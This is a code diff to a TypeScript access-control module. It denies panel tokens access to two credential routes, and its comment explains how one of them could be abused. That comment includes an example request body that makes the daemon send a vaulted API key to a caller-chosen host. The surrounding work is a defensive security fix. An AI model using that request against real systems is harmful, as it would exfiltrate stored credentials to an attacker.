@@ -101,19 +101,32 @@ const agentReach = (method: string, path: string): boolean =>
  * as the app, and a panel is open-ended (an operator UI the owner or the agent wrote), so enumerating what one
  * may call would be guessing at somebody else's app. It stays broad on purpose.
  *
- * ONE CARVE-OUT, and it is the route that hands back stored credentials. `/capabilities/<id>/connection`
- * serves EXTENSION BACKENDS, its whole gate is "no signed-in identity", because the extension token is the
- * only grant that must also declare the route. A panel token also carries no identity, so it satisfied that
- * gate by accident and could read any connected account's config, secrets included: the browser password and
- * the TOTP seed that accounts-tools.ts and the manifest's TOTP rule promise never to hand over. And unlike the
- * extension token, this one is injected into every panel and connector process in the container, where
- * anything that can read /proc can lift it.
+ * THE CARVE-OUT IS "ROUTES THAT PUT A STORED CREDENTIAL IN MOTION", and there are two of them.
  *
- * Written as a denied route rather than an allowlist because that is what the grant IS, everything, except
- * the one door that was never meant for it. An allowlist here would be a fiction the next panel breaks.
+ * `/capabilities/<id>/connection` serves EXTENSION BACKENDS, its whole gate is "no signed-in identity",
+ * because the extension token is the only grant that must also declare the route. A panel token also carries
+ * no identity, so it satisfied that gate by accident and could read any connected account's config, secrets
+ * included: the browser password and the TOTP seed that accounts-tools.ts and the manifest's TOTP rule promise
+ * never to hand over. And unlike the extension token, this one is injected into every panel and connector
+ * process in the container, where anything that can read /proc can lift it.
+ *
+ * `/capabilities/probe` is the same disclosure with the direction reversed, which is why it took a second look
+ * to see. It does not hand the credential back — it SENDS it. The caller supplies the whole config, a `VAULTED`
+ * marker in it is rehydrated from storage before the dial (capabilities.routes.ts withKeptSecrets), and the
+ * destination is caller-supplied too: `baseUrl` for an endpoint, `url` for an MCP server, a `${url}` template
+ * for a connector's declared probe. So `{"id":"…","kind":"endpoint","config":{"baseUrl":"https://elsewhere",
+ * "apiKey":"<vaulted>"}}` makes the daemon present the real key to an address the caller picked, and the ids
+ * and secret field names needed to write that body are what `GET /capabilities` already answers. Exfiltration
+ * rather than a read, and quieter: nothing appears in the response at all.
+ *
+ * Costs a panel nothing real. The Test button is a browser action carrying the signed-in owner's bearer, not a
+ * panel token, and a panel that wants to know whether a connection works reads its `status`.
+ *
+ * Written as denied routes rather than an allowlist because that is what the grant IS, everything, except the
+ * doors that were never meant for it. An allowlist here would be a fiction the next panel breaks.
  */
-const CONNECTION_READ = /^\/capabilities\/[^/]+\/connection$/;
-const panelReach = (_method: string, path: string): boolean => !CONNECTION_READ.test(path);
+const CREDENTIAL_ROUTES = /^\/capabilities\/(?:probe$|[^/]+\/connection$)/;
+const panelReach = (_method: string, path: string): boolean => !CREDENTIAL_ROUTES.test(path);
 
 /* The desktop-sync agent's two routes, and it is worth saying why there are two rather than one.
  *
